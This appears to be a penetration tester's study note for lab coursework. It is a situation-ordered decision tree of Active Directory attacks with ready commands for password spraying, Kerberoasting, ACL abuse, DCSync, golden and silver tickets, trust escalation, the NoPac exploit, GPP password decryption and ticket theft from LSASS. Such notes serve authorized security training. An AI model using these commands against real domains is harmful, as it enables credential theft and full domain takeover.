# Active Directory (Decision Tree)

Symptom-ordered routing for AD attack decisions. Full command syntax in [[Active Directory]], phase-ordered methodology in [[Active Directory Methodology]], teardowns in [[Active Directory (Breakdowns)]].

---

## I need to spray passwords — which tool from which platform?

```
From Kali (Linux side):
  → kerbrute passwordspray -d DOMAIN --dc <DC_IP> users.txt 'Password123!'
    Why: no lockout risk per Kerberos design (userenum only, but passwordspray still triggers 4771 events)
    + Less SMB noise than CrackMapExec
  → crackmapexec smb <DC> -u users.txt -p 'Password123!' --continue-on-success
    Why: confirms SMB auth and shows (Pwn3d!) for admin access in one pass

From Windows foothold:
  → Invoke-DomainPasswordSpray -Password 'Password123!' -Outfile spray.txt
    Why: pulls user list from AD automatically, respects lockout threshold
    
Always check password policy first: crackmapexec smb <DC> -u user -p pass --pass-pol
→ If lockout threshold = 0: spray freely
→ If lockout threshold ≥ 3: stay at 1-2 attempts per account per observation window
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.5. Password Spraying from Windows. DomainPasswordSpray|AD.5]], [[Active Directory Methodology#Step 1.5: Password Policy|Policy check]], [[Active Directory Methodology#Step 2: Password Spraying|Phase 2 Step 2]]

---

## I have valid credentials — what do I enumerate first?

```
1. Run bloodhound-python (quickest broad picture, no foothold needed)
   bloodhound-python -d DOMAIN -u user -p pass -ns <DC_IP> -c all

2. Check BloodHound for:
   → Shortest path to Domain Admins (pre-built query)
   → CanPSRemote / SQLAdmin rights (custom Cypher queries)
   → Kerberoastable accounts ("List all Kerberoastable Accounts" query — check if >0)
   → ACL paths (any user with GenericAll/GenericWrite/ForceChangePassword on a higher-priv account)

3. Kerberoast immediately if BH shows Kerberoastable accounts:
   GetUserSPNs.py -request -dc-ip <DC_IP> DOMAIN/user:pass
   → hashcat -m 13100

4. Check for AS-REP Roastable accounts (no creds needed if null session works, but with creds it's faster):
   impacket-GetNPUsers -request -dc-ip <DC_IP> DOMAIN/user:pass
   → hashcat -m 18200

5. Run Snaffler for credentials in shares:
   .\Snaffler.exe -d DOMAIN -s -v data

6. ACL enumeration with PowerView:
   $sid = Convert-NameToSid <username>
   Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

---

## I have an ACE on a target object — what attack applies?

```
ForceChangePassword (User-Force-Change-Password) on a user account:
  → Set-DomainUserPassword -Identity <target> -AccountPassword $newPass -Credential $Cred
  → Then pivot with new password

GenericAll on a user account:
  → Reset password (same as ForceChangePassword) OR
  → Set SPN → Kerberoast → crack → DCSync if high-priv account
  → Set-DomainObject -Identity <target> -SET @{serviceprincipalname='x/y'} -Credential $Cred
  → Rubeus kerberoast /user:<target> /nowrap → hashcat -m 13100

GenericAll on a group:
  → Add-DomainGroupMember -Identity '<group>' -Members '<your_user>' -Credential $Cred

GenericWrite on a user account:
  → Set SPN → Kerberoast (targeted) — same as GenericAll SPN path above

Self-Membership on a group (user can add themselves):
  → Add-DomainGroupMember -Identity '<group>' -Members '<your_user>' -Credential $Cred

DS-Replication-Get-Changes + DS-Replication-Get-Changes-All on domain:
  → DCSync: lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt
  → impacket-secretsdump DOMAIN/user:pass@<DC_IP>

WriteDACL on an object:
  → Add-DomainObjectACL -Credential $Cred -TargetIdentity <target> -PrincipalIdentity <your_user> -Rights All
  → Then you have GenericAll → use GenericAll path above

WriteOwner on an object:
  → Set-DomainObjectOwner -Credential $Cred -Identity <target> -OwnerIdentity <your_user>
  → Then WriteDACL → add GenericAll → proceed
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.9.3. Common Exploitable Rights|AD.9.3 rights table]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.10. ACL Abuse Chain|AD.10 full chain]]

---

## I have DA / DCSync rights — what do I dump?

```
Priority order:
1. krbtgt hash → Golden Ticket capability (persistent access even after password reset... until krbtgt is rotated)
2. Domain Administrator hash → PtH everywhere
3. All hashes → offline cracking, lateral movement

From Windows (mimikatz):
  lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\krbtgt
  lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\Administrator

From Linux:
  impacket-secretsdump -dc-ip <DC_IP> DOMAIN/user:pass@<DC_IP>
  impacket-secretsdump -dc-ip <DC_IP> -just-dc-user krbtgt DOMAIN/user:pass@<DC_IP>

Check for reversible encryption accounts first:
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}
  → If found: DCSync that account → "Cleartext password:" in output
```

---

## I'm on a child domain — can I reach the parent?

```
Check trust type first:
  Get-DomainTrustMapping
  → WITHIN_FOREST + Bidirectional: YES, ExtraSids attack works (no SID filtering)
  → FOREST_TRANSITIVE: only cross-forest Kerberoasting/credential reuse (SID filtering blocks ExtraSids)

WITHIN_FOREST path (child → parent):
  1. Get child domain SID: Get-DomainSID
  2. Get Enterprise Admins SID: Get-DomainObject -Identity "Enterprise Admins" -Domain PARENT.LOCAL
  3. DCSync child KRBTGT: lsadump::dcsync /user:CHILD\krbtgt
  4. Forge golden ticket: .\Rubeus.exe golden /rc4:<hash> /domain:CHILD.PARENT.LOCAL
                           /sid:<child_sid> /sids:<EA_SID> /user:hacker /ptt
  5. Access parent DC: ls \\parentdc.parent.local\c$

Linux shortcut (automated):
  impacket-raiseChild -target-exec DC01.PARENT.LOCAL CHILD.PARENT.LOCAL/Admin:pass
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.15. Domain Trusts|AD.15 trust types]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.16. Child→Parent Trust Attack (Windows. ExtraSids)|AD.16]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.17. Child→Parent Trust Attack (Linux, raiseChild.py)|AD.17]]

---

## I have a cross-forest (FOREST_TRANSITIVE) trust — what can I do?

```
Cannot inject foreign SIDs (SID filtering is active).
Options:
  1. Kerberoast accounts in the foreign forest:
     Windows: .\Rubeus.exe kerberoast /domain:FOREIGN.LOCAL /rc4opsec /nowrap
     Linux: GetUserSPNs.py -target-domain FOREIGN.LOCAL OUROWN/user:pass -dc-ip <DC_IP> -request
     → hashcat -m 13100 → cracked service account creds

  2. Credential reuse: try cracked/found creds against the foreign domain with netexec/crackmapexec

  3. If a foreign forest user authenticates to your environment (Responder/Inveigh):
     → NTLMv2 hash → crack → use against their forest

  4. Use cracked creds for direct access:
     smbexec.py FOREIGN.LOCAL/user:pass@<foreign_dc_ip>
     evil-winrm -i <foreign_host> -u 'FOREIGN.LOCAL\user' -p pass
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.18. Cross-Forest Trust Abuse (Windows)|AD.18]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.19. Cross-Forest Trust Abuse (Linux)|AD.19]]

---

## The target has MachineAccountQuota > 0 and is unpatched (pre-Nov 2021) — NoPac applies?

```
Check first:
  python3 scanner.py DOMAIN/user:pass -dc-ip <DC_IP> -use-ldap
  → "Got TGT with PAC" → vulnerable

Exploit:
  python3 noPac.py DOMAIN/user:pass -dc-ip <DC_IP> -use-ldap -shell --impersonate administrator
  → NT AUTHORITY\SYSTEM shell on the DC

Why it works: MachineAccountQuota allows creating machine accounts; machine account renames
its sAMAccountName to match a DC name; KDC fallback logic then issues a DC-level PAC.
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.13. Bleeding Edge: NoPac (CVE-2021-42278 + CVE-2021-42287)|AD.13]]

---

## I found writable/readable shares — what am I looking for?

```
Always check SYSVOL first (readable by all domain users):
  ls \\<DC>\sysvol\<domain>\Policies\
  findstr /S /I "cpassword" \\<DC>\sysvol\<domain>\       (cmd)
  → If cpassword found:
      cat the XML file → note <userName> (service account) + <cpassword> (encrypted)
      On Kali: gpp-decrypt "<cpassword_string>"  → plaintext password
      → Spray that password against domain users / use directly if account name is known

  Why cpassword is always recoverable: MS published the AES-256 key on MSDN
  (KB2962486 patched GPP but old XML files often linger in SYSVOL for years)

Custom shares (docshare, Users, backup, Tools):
  → Config files, scripts, .xml files (search for "password", "pass", "cred", "key")
  → .txt files with email threads / "auto-generated" passwords
  → Git repos (.git/config, .env files)
  findstr /S /I "password" \\<host>\<share>\               (cmd — broad sweep)

Folders named "do-not-share" / "private" / "confidential":
  → Almost always misconfigured — open them first
```

Full reference: [[Active Directory Introduction and Enumeration#22.3.5 Enumerating Domain Shares|Module 22 §22.3.5]], [[Active Directory#Domain Shares & SYSVOL|Command Appendix]]

---

## I found GenericAll on a user or group — what do I do?

```
GenericAll on a GROUP (e.g. Management Department):
  → Add yourself or another controlled user:
    net group "Management Department" <your_user> /add /domain
  → Verify: Get-NetGroup "Management Department" | select member
  → Clean up after: net group "Management Department" <your_user> /del /domain

GenericAll on a USER (e.g. robert):
  → Reset their password (no current password needed — GenericAll includes ForceChangePassword):
    net user robert Password123! /domain
  → Test admin access with new creds:
    $pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ("corp\robert", $pass)
    Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock {whoami}
  → If admin on a machine: get flag via UNC admin shares (not direct path — UAC token filtering):
    type "\\<target>\c$\Users\administrator\Desktop\proof.txt"

  Alternatively (more powerful — set SPN for targeted Kerberoasting):
    Set-DomainObject -Credential $Cred -Identity <user> -SET @{serviceprincipalname='x/y'}
    → Rubeus kerberoast /user:<user> /nowrap → hashcat -m 13100
    → Cleanup: Set-DomainObject -Credential $Cred -Identity <user> -Clear serviceprincipalname

Note: PSCredential chain needed only when you are NOT already running as the account that holds the ACE.
If you ARE that account (e.g. you're running as stephanie who has GenericAll), net group/net user work directly.
```

Full reference: [[Active Directory Introduction and Enumeration#22.3.4 Enumerating Object Permissions|Module 22 §22.3.4]], [[Active Directory (Decision Tree)#I have an ACE on a target object, what attack applies?|Decision Tree: ACE attacks]]

---

## I need to collect BloodHound data but can't run SharpHound on the target

```
Remote collection from Kali (just need valid domain creds):
  bloodhound-python -d DOMAIN.LOCAL -u user -p pass -ns <DC_IP> -c all
  zip -r bh.zip *.json → import into BloodHound

Slower but stealthier — no binary needs to touch the DC, traffic looks like LDAP queries.
SharpHound.exe is still faster and collects more session data when AV allows it.
```

---

---

## I have a service account's NTLM hash — what can I do?

```
Option 1: Silver Ticket (no DC interaction after forge — stealthy)
  Need: NTLM hash + Domain SID + target SPN
  → Get Domain SID: whoami /user → strip the RID from the end
  → Forge: mimikatz kerberos::golden /ptt /sid:<sid> /domain:corp.com
            /target:<server.fqdn> /service:<class> /rc4:<hash> /user:jeffadmin
  → Inject is automatic with /ptt → klist to verify → use the service
  
  Service classes: http (IIS), cifs (file shares), host (WinRM/WMI), ldap, mssql
  
  Limit: access only to that one service on that one server. Not a full DA path.

Option 2: Pass-the-Hash (if it's a local/domain admin account)
  → impacket-psexec -hashes :<ntlm> domain/user@<target>
  → crackmapexec smb <subnet> -u user -H <ntlm>

Option 3: Crack it offline (if weak password suspected)
  → hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
```

---

## impacket Kerberos tool gives KRB_AP_ERR_SKEW — what do I do?

```
Kerberos requires client and KDC within 5 minutes. OffSec lab VMs run real time;
Kali can be hours behind if the VM was dormant.

Fix (careful ordering — large offsets kill the VPN):
  1. sudo timedatectl set-ntp false       ← disable NTP daemon first
  2. sudo ntpdate <DC_IP>                 ← jump to DC time (WILL kill VPN if offset >1 min)
  3. Reconnect VPN immediately (TLS session fails on clock jump)
  4. Run impacket command — should work now
  5. sudo timedatectl set-ntp true        ← restore NTP after lab

Alternative (keep VPN alive):
  sudo apt install libfaketime
  faketime "$(date -d "$(ntpdate -q <DC_IP> | tail -1 | awk '{print $1,$2}')" +%s)" impacket-GetUserSPNs ...
  (wraps just the impacket process — system clock unchanged — VPN survives)

⚠️ Repeated failed auth from clock-skew errors can lock accounts (Kerberos pre-auth failures count).
   Fix the clock BEFORE spraying or Kerberoasting.
```

---

## Rubeus fails over evil-winrm — what do I do?

```
evil-winrm authenticates via NTLM → no Kerberos TGT exists in the session.
Rubeus needs a TGT to request service tickets.

Symptom: "No credentials are available in the security package" or "An operations error occurred"

Options:
  1. Use impacket from Kali instead (always works — impacket is Kerberos-native):
     impacket-GetUserSPNs -request -dc-ip <DC_IP> domain/user:pass
     impacket-GetNPUsers -dc-ip <DC_IP> -request domain/user:pass

  2. RDP to the target instead (RDP session gets a real TGT) → then Rubeus works fine

  3. Rubeus /spn:<specific_SPN> flag bypasses user LDAP lookup — but still needs a TGT → fails same way
```

---

---

## whoami /groups shows BUILTIN\Administrators as "Group used for deny only" — what does that mean?

```
UAC is filtering the token. The user IS a local admin (their SID is in the Administrators group)
but the interactive RDP/logon session stripped elevated privileges at login.
You have a medium integrity token, not high.

Two paths forward:
  1. Elevate on THIS machine:
     Start-Process powershell.exe -Verb RunAs
     → UAC consent dialog pops in the RDP session → click Yes
     → New elevated PS window (high integrity) → now Mimikatz, registry writes etc work

  2. Look ELSEWHERE — their local admin may carry to other machines:
     crackmapexec smb <subnet> -u <user> -p '<pass>' -d <domain> --continue-on-success
     → Look for (Pwn3d!) — that's a machine where they have unfiltered admin access
     → Connect there via impacket-wmiexec / impacket-psexec with plaintext creds
     
Key signal: Medium Mandatory Level in whoami /groups = filtered token (UAC active).
High Mandatory Level = elevated. SYSTEM Mandatory Level = SYSTEM.

⚠️ Don't use PsExec or net use \\target\ADMIN$ from the filtered session — they'll fail.
```

Full reference: [[Lateral Movement in Active Directory#Capstone Lessons|Module 24 Capstone Lessons]]

---

## I have local admin on a machine and other users are logged in — what can I steal?

```
Other users' Kerberos tickets live in LSASS regardless of whose session they came from.
With local admin (elevated) you can dump ALL sessions at once.

From elevated Mimikatz:
  privilege::debug
  sekurlsa::tickets /export
  → Writes all TGT and TGS from all sessions to .kirbi files in current dir

Read the filenames — they tell you everything:
  [0;xxxx]-0-0-40810000-dave@cifs-web04.kirbi → Group 0 = TGS for cifs/web04 as dave
  [0;xxxx]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi → Group 2 = TGT for dave

Inject a TGS (if you just need that one service):
  kerberos::ptt [0;xxxx]-0-0-40810000-dave@cifs-web04.kirbi
  ls \\web04\backup   ← now works with dave's access

Inject a TGT (if you want to request new TGSes for any service):
  kerberos::ptt [0;xxxx]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
  klist   ← verify
  PsExec.exe \\web04 cmd   ← use HOSTNAME not IP (Kerberos)

Group 0 = TGS (service-specific), Group 2 = TGT (domain-wide). The number after
the second dash in the filename: 0-0 = TGS, 2-0 = TGT.
```

Full reference: [[Lateral Movement in Active Directory#24.1.5 Pass the Ticket (PtT)|Module 24 §24.1.5]]

---

#### Tags: #DecisionTree #ActiveDirectory #ADEnum #PasswordSpray #ACLAbuse #DCSync #SilverTicket #Kerberoasting #KerberosClockSkew #DomainTrust #ExtraSids #NoPac #CrossForest #BloodHound #HTBSupplementary #Module22 #Module23 #SYSVOL #GPP #GenericAll #DomainShares #LateralMovement #PassTheTicket #UACFiltering #Module24
